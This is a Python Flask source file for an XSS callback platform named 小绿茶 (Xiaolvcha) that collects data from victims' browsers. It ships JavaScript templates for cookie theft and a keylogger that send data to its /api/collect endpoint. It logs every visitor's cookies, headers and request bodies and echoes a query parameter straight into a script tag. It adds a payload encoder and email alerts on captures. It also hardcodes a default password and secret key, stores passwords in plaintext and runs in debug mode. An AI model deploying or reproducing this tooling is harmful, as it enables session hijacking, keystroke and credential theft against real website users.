#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
小绿茶XSS反连平台 - Flask后端应用
版本: 1.0.0
"""
import re
import os
import json
import uuid
import datetime
from pathlib import Path
from functools import wraps
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ipaddress

from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_from_directory
from flask_session import Session

class ConfigManager:
    """配置管理器，实时读取和更新配置"""
    
    @staticmethod
    def get_fixed_password():
        """从配置文件获取固定密码"""
        settings = load_json_data(SETTINGS_FILE)
        return settings.get('security', {}).get('fixed_password', 'godxing')
    
    @staticmethod
    def get_smtp_config():
        """获取SMTP配置"""
        settings = load_json_data(SETTINGS_FILE)
        return settings.get('smtp', {})
    
    @staticmethod
    def get_notification_config():
        """获取通知配置"""
        settings = load_json_data(SETTINGS_FILE)
        return settings.get('notifications', {})
    
    @staticmethod
    def get_security_config():
        """获取安全配置"""
        settings = load_json_data(SETTINGS_FILE)
        return settings.get('security', {})
    
    @staticmethod
    def update_config(section, key, value):
        """更新配置"""
        settings = load_json_data(SETTINGS_FILE)
        if section not in settings:
            settings[section] = {}
        settings[section][key] = value
        save_json_data(SETTINGS_FILE, settings)


# 创建Flask应用
app = Flask(__name__)
app.config['SECRET_KEY'] = 'xiaolvcha-xss-platform-secret-key-2025'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_FILE_DIR'] = './data/sessions'
app.config['SESSION_PERMANENT'] = False
app.config['has_new_logs'] = False

# 初始化会话
Session(app)

# 全局配置
DATA_DIR = Path('./data')
TEMPLATE_DIR = Path('./jstemplates')
PAYLOAD_DIR = Path('./myjs')

# 确保目录存在
DATA_DIR.mkdir(exist_ok=True)
TEMPLATE_DIR.mkdir(exist_ok=True)
PAYLOAD_DIR.mkdir(exist_ok=True)
# 确保目录有读写权限
try:
    # 测试写入权限
    test_file = PAYLOAD_DIR / 'test.txt'
    test_file.write_text('test')
    test_file.unlink()
except Exception as e:
    print(f"警告: Payload目录没有写入权限: {e}")


# 数据文件路径
USERS_FILE = DATA_DIR / 'users.json'
LOGS_FILE = DATA_DIR / 'logs.json'
SETTINGS_FILE = DATA_DIR / 'settings.json'

# 初始化数据文件
def init_data_files():
    """初始化数据文件"""
    # 确保所有必要目录都存在
    directories = [DATA_DIR, PAYLOAD_DIR, TEMPLATE_DIR]
    for directory in directories:
        directory.mkdir(exist_ok=True)
    
    # 初始化用户文件
    if not USERS_FILE.exists():
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"admin": {"password": ConfigManager.get_fixed_password(), "created": datetime.datetime.now().isoformat()}}, f, ensure_ascii=False, indent=2)
    
    # 初始化日志文件
    if not LOGS_FILE.exists():
        with open(LOGS_FILE, 'w', encoding='utf-8') as f:
            json.dump([], f, ensure_ascii=False, indent=2)
    
    # 初始化设置文件
    if not SETTINGS_FILE.exists():
        default_settings = {
            "security": {
                "fixed_password": "godxing",
                "session_timeout": 60,
                "ip_whitelist": False,
                "allowed_ips": "127.0.0.1\n192.168.0.0/16",
                "rate_limit": True,
                "max_requests": 100,
                "block_duration": 30
            },
            "smtp": {
                "enabled": False,
                "server": "",
                "port": 587,
                "username": "",
                "password": "",
                "recipient": "",
                "security": "tls"
            },
            "notifications": {
                "email_enabled": False,
                "new_request_alert": True,
                "interval": "immediate"
            }
        }
        with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_settings, f, ensure_ascii=False, indent=2)


# 初始化模板文件
def init_template_files():
    """初始化JS模板文件"""
    templates = {
        "basic-alert.js": "// 基础Alert弹窗\nalert('XSS Test by 小绿茶平台');\nconsole.log('XSS payload executed');",
        "cookie-steal.js": "// Cookie窃取Payload\nvar cookies = document.cookie;\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/api/collect', true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({\n    type: 'cookie',\n    data: cookies,\n    url: window.location.href\n}));",
        "redirect.js": "// 页面重定向\nwindow.location.href = 'https://www.example.com';",
        "keylogger.js": "// 键盘记录器\ndocument.addEventListener('keydown', function(e) {\n    var key = e.key;\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', '/api/collect', true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.send(JSON.stringify({\n        type: 'keystroke',\n        data: key,\n        url: window.location.href\n    }));\n});"
    }
    
    for filename, content in templates.items():
        template_file = TEMPLATE_DIR / filename
        if not template_file.exists():
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(content)



def ip_whitelist_required(f):
    """IP白名单检查装饰器"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 只有在启用IP白名单时才检查
        settings = load_json_data(SETTINGS_FILE)
        if settings.get('security', {}).get('ip_whitelist', False):
            allowed_ips = settings.get('security', {}).get('allowed_ips', '').split('\n')
            client_ip = request.remote_addr
            
            # 如果是本地访问，直接允许（开发环境）
            if client_ip in ['127.0.0.1', 'localhost']:
                return f(*args, **kwargs)
            
            # 检查IP是否在白名单中
            ip_allowed = False
            
            for ip_pattern in allowed_ips:
                ip_pattern = ip_pattern.strip()
                if not ip_pattern:
                    continue
                
                try:
                    # 处理单个IP
                    if '/' not in ip_pattern:
                        if client_ip == ip_pattern:
                            ip_allowed = True
                            break
                    # 处理CIDR格式
                    else:
                        network = ipaddress.ip_network(ip_pattern, strict=False)
                        client_ip_obj = ipaddress.ip_address(client_ip)
                        if client_ip_obj in network:
                            ip_allowed = True
                            break
                except (ValueError, ipaddress.AddressValueError) as e:
                    print(f"IP白名单配置错误: {ip_pattern} - {e}")
                    continue
            
            if not ip_allowed:
                print(f"IP {client_ip} 不在白名单中，拒绝访问")
                return jsonify({"error": f"IP地址 {client_ip} 不在白名单中"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
# 工具函数
def login_required(f):
    """登录装饰器"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def load_json_data(filepath):
    """加载JSON数据"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
            # 确保返回的是列表类型（对于日志文件）
            if filepath == LOGS_FILE and not isinstance(data, list):
                return []
            return data
    except (FileNotFoundError, json.JSONDecodeError):
        # 对于日志文件，返回空列表；其他文件返回空字典
        if filepath == LOGS_FILE:
            return []
        return {}



def save_json_data(filepath, data):
    """保存JSON数据"""
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def send_email_notification(subject, body):
    """发送邮件通知"""
    try:
        smtp_config = ConfigManager.get_smtp_config()
        
        if not smtp_config.get('enabled', False):
            return False
            
        msg = MIMEMultipart()
        msg['From'] = smtp_config['username']
        msg['To'] = smtp_config['recipient']
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(smtp_config['server'], smtp_config['port'])
        server.starttls()
        server.login(smtp_config['username'], smtp_config['password'])
        server.send_message(msg)
        server.quit()
        
        return True
    except Exception as e:
        print(f"邮件发送失败: {e}")
        return False
# 路由定义
@app.route('/')
def index():
    """XSS数据接收端点"""
    # 收集访问者信息
    visitor_data = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "url": request.url,
        "method": request.method,
        "cookies": request.cookies.to_dict(),
        "args": dict(request.args),
        "form": dict(request.form),
        "json": request.get_json(silent=True) or {},
        "headers": dict(request.headers),
        # 新增：完整请求体数据
        "raw_data": request.get_data(as_text=True) if request.get_data() else None,
        "content_type": request.headers.get('Content-Type', ''),
        "content_length": request.headers.get('Content-Length', '0'),
        "host": request.headers.get('Host', ''),
        "accept": request.headers.get('Accept', ''),
        "accept_encoding": request.headers.get('Accept-Encoding', ''),
        "accept_language": request.headers.get('Accept-Language', ''),
        "connection": request.headers.get('Connection', ''),
        # 新增：文件上传信息
        "files": {key: {
            "filename": file.filename,
            "content_type": file.content_type,
            "size": len(file.read()) if file else 0
        } for key, file in request.files.items()} if request.files else {}
    }
    
    # 重置文件指针（如果读取了文件内容）
    for file in request.files.values():
        if file:
            file.seek(0)
    
    # 保存日志
    logs = load_json_data(LOGS_FILE)
    
    # 修复：确保logs是列表类型
    if not isinstance(logs, list):
        logs = []
    
    logs.append(visitor_data)
    # 发送即时提醒（如果启用）
    notifications_config = ConfigManager.get_notification_config()
    if notifications_config.get('new_request_alert', True):
        app.config['has_new_logs'] = True

    # 发送邮件通知
    if len(logs) > 0:  # 只在有新数据时发送
        if notifications_config.get('email_enabled', False):
            subject = "🍃 小绿茶XSS平台 - 新请求捕获"
            body = f"""
    检测到新的XSS请求！

    时间: {visitor_data['timestamp']}
    IP地址: {visitor_data['ip']}
    User-Agent: {visitor_data['user_agent'][:100]}...
    来源页面: {visitor_data['referer']}
    请求方法: {visitor_data['method']}

    请登录平台查看详细信息。
            """
            send_email_notification(subject, body)
    
    # 返回空白页面或JavaScript
    js_payload = request.args.get('js', '')
    if js_payload:
        return f"""
        <!DOCTYPE html>
        <html>
        <head><title>小绿茶XSS平台</title></head>
        <body>
        <script>
        {js_payload}
        </script>
        </body>
        </html>
        """, 200, {'Content-Type': 'text/html; charset=utf-8'}
    
    return "", 200


# 日志收集API

@app.route('/api/collect', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def api_collect():
    """通用数据收集接口，接收任何格式的数据"""
    try:
        # 收集访问者信息
        visitor_data = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', ''),
            "referer": request.headers.get('Referer', ''),
            "url": request.url,
            "method": request.method,
            "endpoint": "/api/collect",
            # 新增完整请求信息
            "cookies": request.cookies.to_dict(),
            "headers": dict(request.headers),
            "raw_data": request.get_data(as_text=True) if request.get_data() else None,
            "content_type": request.headers.get('Content-Type', ''),
            "content_length": request.headers.get('Content-Length', '0')
        }
        
        # 根据请求方法处理不同格式的数据
        if request.method == 'GET':
            # GET请求：获取URL参数
            visitor_data["data_type"] = "query_params"
            visitor_data["data"] = dict(request.args)
            
        elif request.method in ['POST', 'PUT', 'PATCH']:
            # 处理不同内容类型的数据
            content_type = request.headers.get('Content-Type', '').lower()
            
            if 'application/json' in content_type:
                # JSON数据
                json_data = request.get_json(silent=True) or {}
                visitor_data["data_type"] = "json"
                visitor_data["data"] = json_data
                
            elif 'application/x-www-form-urlencoded' in content_type:
                # 表单数据
                visitor_data["data_type"] = "form"
                visitor_data["data"] = dict(request.form)
                
            elif 'multipart/form-data' in content_type:
                # 文件上传数据
                visitor_data["data_type"] = "multipart"
                form_data = dict(request.form)
                # 记录文件信息（包含文件内容）
                file_info = {}
                for file_key in request.files:
                    file_obj = request.files[file_key]
                    file_content = file_obj.read().decode('utf-8', errors='ignore')
                    file_obj.seek(0)  # 重置文件指针
                    file_info[file_key] = {
                        "filename": file_obj.filename,
                        "content_type": file_obj.content_type,
                        "size": len(file_content),
                        "content": file_content  # 新增：包含文件内容
                    }
                visitor_data["data"] = {"form": form_data, "files": file_info}
                
            elif 'text/plain' in content_type:
                # 纯文本数据
                visitor_data["data_type"] = "text"
                visitor_data["data"] = request.get_data(as_text=True)
                
            else:
                # 其他类型的数据，尝试多种解析方式
                visitor_data["data_type"] = "raw"
                # 尝试JSON
                json_data = request.get_json(silent=True)
                if json_data is not None:
                    visitor_data["data_type"] = "auto_json"
                    visitor_data["data"] = json_data
                else:
                    # 尝试表单数据
                    try:
                        form_data = dict(request.form)
                        if form_data:
                            visitor_data["data_type"] = "auto_form"
                            visitor_data["data"] = form_data
                        else:
                            # 原始数据
                            raw_data = request.get_data(as_text=True)
                            if raw_data:
                                visitor_data["data"] = raw_data
                            else:
                                visitor_data["data"] = "no_data"
                    except:
                        # 最后尝试原始数据
                        raw_data = request.get_data(as_text=True)
                        visitor_data["data"] = raw_data if raw_data else "no_data"
        
        elif request.method == 'DELETE':
            visitor_data["data_type"] = "delete_request"
            visitor_data["data"] = dict(request.args)
            
        elif request.method == 'OPTIONS':
            visitor_data["data_type"] = "options_request"
            visitor_data["data"] = {"headers": dict(request.headers)}
        
        # 保存日志
        logs = load_json_data(LOGS_FILE)
        
        # 修复：确保logs是列表类型
        if not isinstance(logs, list):
            logs = []
        
        logs.append(visitor_data)
        settings = load_json_data(SETTINGS_FILE)
        if settings.get('notifications', {}).get('new_request_alert', True):
            # 通过 WebSocket 或前端轮询方式通知前端
            # 这里我们使用一个简单的全局变量来标记有新日志
            app.config['has_new_logs'] = True
        save_json_data(LOGS_FILE, logs)
        
        # 发送邮件通知
        if len(logs) > 0:  # 只在有新数据时发送
            settings = load_json_data(SETTINGS_FILE)
            if settings.get('notifications', {}).get('email_enabled', False):
                subject = "🍃 小绿茶XSS平台 - 新数据收集"
                body = f"""
检测到新的数据收集请求！

时间: {visitor_data['timestamp']}
IP地址: {visitor_data['ip']}
数据类型: {visitor_data.get('data_type', 'unknown')}
来源页面: {visitor_data['referer']}

请登录平台查看详细信息。
                """
                send_email_notification(subject, body)
        
        # 返回成功响应，支持CORS
        response = jsonify({
            "status": "success",
            "message": "Data collected successfully",
            "id": visitor_data["id"]
        })
        
        # 添加CORS头，方便跨域请求
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        
        return response, 200
        
    except Exception as e:
        print(f"数据收集接口错误: {e}")
        error_response = jsonify({
            "status": "error",
            "message": f"Data collection failed: {str(e)}"
        })
        error_response.headers.add('Access-Control-Allow-Origin', '*')
        return error_response, 500

@app.route('/api/config/update', methods=['POST'])
@login_required
def update_config():
    """更新配置"""
    data = request.get_json()
    section = data.get('section')
    key = data.get('key')
    value = data.get('value')
    
    if not all([section, key, value is not None]):
        return jsonify({"success": False, "message": "参数不完整"})
    
    try:
        ConfigManager.update_config(section, key, value)
        return jsonify({"success": True, "message": "配置更新成功"})
    except Exception as e:
        return jsonify({"success": False, "message": f"配置更新失败: {str(e)}"})

@app.route('/api/settings/test-smtp', methods=['POST'])
@login_required
def test_smtp():
    """测试SMTP配置"""
    try:
        data = request.get_json()
        
        # 这里应该实现实际的邮件发送测试
        # 暂时返回成功
        return jsonify({
            "success": True,
            "message": "测试邮件发送功能（实际发送功能待实现）"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"测试失败: {str(e)}"
        })



@app.route('/payloads/<filename>')
def serve_payload_file(filename):
    """提供JS Payload文件的静态访问"""
    try:
        # 安全检查：确保文件名合法
        if not filename.endswith('.js') or '..' in filename or filename.startswith('/'):
            return "Invalid filename", 400
        
        payload_file = PAYLOAD_DIR / filename
        
        if payload_file.exists() and payload_file.is_file():
            # 设置正确的MIME类型
            return send_from_directory(
                PAYLOAD_DIR, 
                filename, 
                mimetype='application/javascript',
                as_attachment=False
            )
        else:
            return "File not found", 404
            
    except Exception as e:
        print(f"Error serving payload file {filename}: {e}")
        return "Internal server error", 500

@app.route('/login', methods=['GET', 'POST'])
def login():
    """用户登录"""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        
        # 从 users.json 文件读取用户信息进行验证
        users = load_json_data(USERS_FILE)
        
        # 检查用户是否存在且密码正确
        if username in users and users[username].get('password') == password:
            session['logged_in'] = True
            session['username'] = username
            return jsonify({"success": True, "redirect": url_for('dashboard')})
        else:
            return jsonify({"success": False, "message": "用户名或密码错误！"})
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """用户退出"""
    session.clear()
    return redirect(url_for('login'))

# API路由 - 认证检查
@app.route('/api/auth/check')
def api_auth_check():
    """检查用户认证状态"""
    if 'logged_in' in session:
        return jsonify({
            "authenticated": True,
            "user": {
                "username": session.get('username', '管理员')
            }
        })
    else:
        return jsonify({
            "authenticated": False
        }), 401



@app.route('/admin')
@login_required
@ip_whitelist_required
def dashboard():
    """管理后台首页"""
    return render_template('dashboard.html')

@app.route('/admin/templates')
@login_required
@ip_whitelist_required
def templates_page():
    """模板管理页面"""
    return render_template('templates.html')

@app.route('/admin/payloads')
@login_required
@ip_whitelist_required
def payloads_page():
    """JS Payload管理页面"""
    return render_template('payload.html')

@app.route('/admin/logs')
@login_required
@ip_whitelist_required
def logs_page():
    """日志查看页面"""
    return render_template('logs.html')

@app.route('/admin/settings')
@login_required
@ip_whitelist_required
def settings_page():
    """系统设置页面"""
    return render_template('settings.html')


@app.route('/api/logs/check-new')
@login_required
def check_new_logs():
    """检查是否有新日志"""
    has_new = app.config.get('has_new_logs', False)
    if has_new:
        # 重置标志
        app.config['has_new_logs'] = False
        return jsonify({"has_new": True})
    return jsonify({"has_new": False})

# API路由 - 模板管理
@app.route('/api/templates', methods=['GET', 'POST', 'DELETE'])
@login_required
def api_templates():
    """模板管理API"""
    if request.method == 'GET':
        templates = []
        for file in TEMPLATE_DIR.glob('*.js'):
            templates.append({
                "name": file.stem,
                "filename": file.name,
                "size": file.stat().st_size,
                "modified": datetime.datetime.fromtimestamp(file.stat().st_mtime).isoformat()
            })
        return jsonify(templates)
    
    elif request.method == 'POST':
        data = request.get_json()
        filename = data.get('filename', '').strip()
        content = data.get('content', '')
        
        if not filename.endswith('.js'):
            filename += '.js'
        
        if not filename or not content:
            return jsonify({"success": False, "message": "文件名和内容不能为空"})
        
        template_file = TEMPLATE_DIR / filename
        try:
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(content)
            return jsonify({"success": True, "message": "模板创建成功"})
        except Exception as e:
            return jsonify({"success": False, "message": f"创建失败: {str(e)}"})
    
    elif request.method == 'DELETE':
        data = request.get_json()
        filename = data.get('filename', '')
        
        template_file = TEMPLATE_DIR / filename
        try:
            if template_file.exists():
                template_file.unlink()
                return jsonify({"success": True, "message": "模板删除成功"})
            else:
                return jsonify({"success": False, "message": "模板文件不存在"})
        except Exception as e:
            return jsonify({"success": False, "message": f"删除失败: {str(e)}"})

@app.route('/api/templates/<filename>')
@login_required
def get_template_content(filename):
    """获取模板内容"""
    template_file = TEMPLATE_DIR / filename
    if template_file.exists():
        with open(template_file, 'r', encoding='utf-8') as f:
            content = f.read()
        return jsonify({"content": content})
    return jsonify({"error": "文件不存在"}), 404

# API路由 - JS Payload管理
@app.route('/api/payloads', methods=['GET', 'POST', 'DELETE'])
@login_required
def api_payloads():
    """JS Payload管理API"""
    if request.method == 'GET':
        payloads = []
        try:
            # 确保目录存在
            PAYLOAD_DIR.mkdir(exist_ok=True)
            
            # 获取所有js文件
            js_files = list(PAYLOAD_DIR.glob('*.js'))
            print(f"找到 {len(js_files)} 个JS文件: {[f.name for f in js_files]}")
            
            if not js_files:
                # 目录为空，返回空数组
                print("Payload目录为空")
                return jsonify([])
                
            for file in js_files:
                try:
                    # 检查文件是否可读
                    if file.is_file() and file.exists():
                        stat = file.stat()
                        # 修复：确保文件大小正确读取
                        file_size = stat.st_size
                        # 修复：确保修改时间正确读取
                        modified_time = datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
                        
                        payload_data = {
                            "name": file.stem,
                            "filename": file.name,
                            "size": file_size,
                            "modified": modified_time
                        }
                        print(f"处理文件: {file.name}, 大小: {file_size} bytes, 修改时间: {modified_time}")
                        payloads.append(payload_data)
                    else:
                        print(f"文件不存在或不是文件: {file}")
                except Exception as e:
                    print(f"处理文件 {file} 时出错: {e}")
                    # 即使单个文件出错，也继续处理其他文件
                    continue
                    
        except Exception as e:
            print(f"访问payload目录时出现严重错误: {e}")
            # 确保返回有效的JSON响应
            return jsonify({"error": str(e)}), 500
        
        # 按修改时间排序，最新的在前面
        payloads.sort(key=lambda x: x['modified'], reverse=True)
        print(f"返回 {len(payloads)} 个payload")
        return jsonify(payloads)
    
    elif request.method == 'POST':
        """创建或更新JS Payload文件"""
        data = request.get_json()
        filename = data.get('filename', '').strip()
        content = data.get('content', '')
        
        if not filename:
            return jsonify({"success": False, "message": "文件名不能为空"})
        
        # 确保文件名以.js结尾
        if not filename.endswith('.js'):
            filename += '.js'
        
        # 验证文件名
        if not re.match(r'^[a-zA-Z0-9_-]+\.js$', filename):
            return jsonify({"success": False, "message": "文件名只能包含字母、数字、下划线和短横线"})
        
        payload_file = PAYLOAD_DIR / filename
        
        try:
            # 确保目录存在
            PAYLOAD_DIR.mkdir(exist_ok=True)
            
            # 写入文件
            with open(payload_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            # 获取文件统计信息
            stat = payload_file.stat()
            
            return jsonify({
                "success": True, 
                "message": "文件保存成功",
                "filename": filename,
                "size": stat.st_size,
                "modified": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
            })
            
        except Exception as e:
            print(f"保存文件失败: {e}")
            return jsonify({
                "success": False, 
                "message": f"保存失败: {str(e)}"
            }), 500
    
    elif request.method == 'DELETE':
        """删除JS Payload文件"""
        data = request.get_json()
        filename = data.get('filename', '')
        
        if not filename:
            return jsonify({"success": False, "message": "文件名不能为空"})
        
        payload_file = PAYLOAD_DIR / filename
        
        try:
            if payload_file.exists():
                payload_file.unlink()
                return jsonify({"success": True, "message": "文件删除成功"})
            else:
                return jsonify({"success": False, "message": "文件不存在"})
                
        except Exception as e:
            print(f"删除文件失败: {e}")
            return jsonify({
                "success": False, 
                "message": f"删除失败: {str(e)}"
            }), 500





@app.route('/api/payloads/<filename>')
@login_required
def get_payload_content(filename):
    """获取payload内容"""
    import urllib.parse
    # 解码文件名
    decoded_filename = urllib.parse.unquote(filename)
    payload_file = PAYLOAD_DIR / decoded_filename
    
    print(f"请求文件内容: {decoded_filename}, 文件路径: {payload_file}")
    
    if payload_file.exists():
        try:
            with open(payload_file, 'r', encoding='utf-8') as f:
                content = f.read()
            return jsonify({"content": content})
        except Exception as e:
            print(f"读取文件失败: {e}")
            return jsonify({"error": f"读取文件失败: {str(e)}"}), 500
    return jsonify({"error": "文件不存在"}), 404


# API路由 - 日志管理
@app.route('/api/logs', methods=['GET'])
@login_required
def api_logs():
    """日志管理API"""
    logs = load_json_data(LOGS_FILE)
    
    # 获取查询参数
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    ip_filter = request.args.get('ip', '')
    
    # 过滤日志
    filtered_logs = logs
    if ip_filter:
        filtered_logs = [log for log in logs if log.get('ip') == ip_filter]
    
    # 分页
    total = len(filtered_logs)
    start = (page - 1) * per_page
    end = start + per_page
    paginated_logs = filtered_logs[start:end]
    
    return jsonify({
        "logs": paginated_logs,
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": (total + per_page - 1) // per_page
    })

@app.route('/api/logs/<log_id>')
@login_required
def get_log_detail(log_id):
    """获取日志详情"""
    logs = load_json_data(LOGS_FILE)
    log = next((log for log in logs if log.get('id') == log_id), None)
    
    if log:
        return jsonify(log)
    return jsonify({"error": "日志不存在"}), 404

@app.route('/api/logs/stats')
@login_required
def get_logs_stats():
    """获取日志统计"""
    logs = load_json_data(LOGS_FILE)
    
    if not logs:
        return jsonify({
            "total": 0,
            "today": 0,
            "unique_ips": 0,
            "recent_activity": []
        })
    
    # 基础统计
    total = len(logs)
    
    # 今日统计
    today = datetime.datetime.now().date()
    today_logs = [log for log in logs if datetime.datetime.fromisoformat(log['timestamp']).date() == today]
    
    # 唯一IP统计
    unique_ips = len(set(log['ip'] for log in logs))
    
    # 最近活动（最近5条）
    recent_logs = sorted(logs, key=lambda x: x['timestamp'], reverse=True)[:5]
    
    return jsonify({
        "total": total,
        "today": len(today_logs),
        "unique_ips": unique_ips,
        "recent_activity": recent_logs
    })


# 在 app.py 的 API 路由部分添加

@app.route('/api/logs/clear', methods=['POST'])
@login_required
def clear_logs():
    """清空所有日志"""
    try:
        # 创建一个空的日志数组
        empty_logs = []
        
        # 保存空数组到日志文件
        save_json_data(LOGS_FILE, empty_logs)
        
        return jsonify({
            "success": True, 
            "message": "日志已清空",
            "cleared_count": 0  # 因为我们不知道之前有多少条，所以设为0
        })
        
    except Exception as e:
        print(f"清空日志失败: {e}")
        return jsonify({
            "success": False, 
            "message": f"清空失败: {str(e)}"
        }), 500
    

@app.route('/api/logs/clear-with-backup', methods=['POST'])
@login_required
def clear_logs_with_backup():
    """清空日志并创建备份"""
    try:
        # 先读取当前日志
        current_logs = load_json_data(LOGS_FILE)
        
        if not current_logs or len(current_logs) == 0:
            return jsonify({
                "success": False,
                "message": "没有日志需要清空"
            })
        
        # 创建备份文件
        backup_filename = f"logs_backup_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        backup_file = DATA_DIR / backup_filename
        
        # 保存备份
        with open(backup_file, 'w', encoding='utf-8') as f:
            json.dump(current_logs, f, ensure_ascii=False, indent=2)
        
        # 清空当前日志
        empty_logs = []
        save_json_data(LOGS_FILE, empty_logs)
        
        return jsonify({
            "success": True,
            "message": f"日志已清空，已创建备份文件: {backup_filename}",
            "cleared_count": len(current_logs),
            "backup_file": backup_filename
        })
        
    except Exception as e:
        print(f"清空日志失败: {e}")
        return jsonify({
            "success": False,
            "message": f"清空失败: {str(e)}"
        }), 500







# API路由 - 系统设置
@app.route('/api/settings', methods=['GET', 'POST'])
@login_required
@ip_whitelist_required
def api_settings():
    """系统设置API"""
    if request.method == 'GET':
        settings = load_json_data(SETTINGS_FILE)
        # 不返回敏感信息
        if 'smtp' in settings:
            settings['smtp']['password'] = ''
        return jsonify(settings)
    
    elif request.method == 'POST':
        data = request.get_json()
        
        # 新增：处理密码修改
        if 'password_change' in data:
            old_password = data['password_change'].get('old_password', '')
            new_password = data['password_change'].get('new_password', '')
            confirm_password = data['password_change'].get('confirm_password', '')
            
            # 验证密码
            if not old_password or not new_password or not confirm_password:
                return jsonify({"success": False, "message": "请填写完整的密码信息"})
            
            if new_password != confirm_password:
                return jsonify({"success": False, "message": "新密码和确认密码不一致"})
            
            if len(new_password) < 4:
                return jsonify({"success": False, "message": "新密码长度至少4位"})
            
            # 验证旧密码 - 从 users.json 文件验证
            users = load_json_data(USERS_FILE)
            current_username = session.get('username', 'admin')

            if current_username not in users:
                return jsonify({"success": False, "message": "用户不存在"})

            # 从 users.json 获取密码进行验证
            if old_password != users[current_username].get('password', ''):
                return jsonify({"success": False, "message": "旧密码错误"})
            
            # 更新密码到 users.json
            users[current_username]['password'] = new_password
            save_json_data(USERS_FILE, users)
            
            return jsonify({
                "success": True, 
                "message": "密码修改成功，请重新登录",
                "require_relogin": True  # 新增标志
            })
        
        # 原有的设置保存逻辑
        current_settings = load_json_data(SETTINGS_FILE)
        
        # 更新SMTP设置（包含通知模板）
        if 'smtp' in data:
            current_settings['smtp'].update(data['smtp'])
        
        # 更新通知设置（只保留即时提醒开关）
        if 'notifications' in data:
            # 只保存即时提醒设置，移除邮件启用设置
            notifications_update = {
                'new_request_alert': data['notifications'].get('new_request_alert', True)
            }
            current_settings['notifications'].update(notifications_update)
        
        # 更新安全设置
        if 'security' in data:
            current_settings.setdefault('security', {})
            current_settings['security'].update(data['security'])
        
        save_json_data(SETTINGS_FILE, current_settings)
        return jsonify({"success": True, "message": "设置保存成功"})

# 工具API
@app.route('/api/utils/format-js', methods=['POST'])
@login_required
def format_javascript():
    """格式化JavaScript代码"""
    data = request.get_json()
    code = data.get('code', '')
    
    # 简单的JS格式化（实际项目中可以使用jsbeautifier库）
    formatted = code.replace(';', ';\n').replace('{', '{\n').replace('}', '\n}')
    
    return jsonify({"formatted": formatted})

@app.route('/api/utils/encode-payload', methods=['POST'])
@login_required
def encode_payload():
    """编码Payload"""
    data = request.get_json()
    payload = data.get('payload', '')
    encode_type = data.get('type', 'url')
    
    if encode_type == 'url':
        import urllib.parse
        encoded = urllib.parse.quote(payload)
    elif encode_type == 'base64':
        import base64
        encoded = base64.b64encode(payload.encode()).decode()
    elif encode_type == 'html':
        import html
        encoded = html.escape(payload)
    else:
        encoded = payload
    
    return jsonify({"encoded": encoded})

# 错误处理
@app.errorhandler(404)
def not_found(error):
    return render_template('error.html', error_code=404, error_message="页面未找到"), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('error.html', error_code=500, error_message="服务器内部错误"), 500


# 主程序入口
if __name__ == '__main__':
    init_data_files()
    init_template_files()
    
    # 获取当前密码
    users = load_json_data(USERS_FILE)
    current_password = "godxing"  # 默认值
    if users and 'admin' in users:
        current_password = users['admin'].get('password', 'godxing')
    
    print("🍃 小绿茶XSS反连平台启动中...")
    print("管理后台: http://0.0.0.0:5000/admin")
    print("xss反连地址: http://0.0.0.0:5000")
    print("xss反连地址2: http://0.0.0.0:5000/api/collect")
    print(f"登录密码: {current_password}")  # 修改这里，输出实际密码
    
    app.run(debug=True, host='0.0.0.0', port=5000)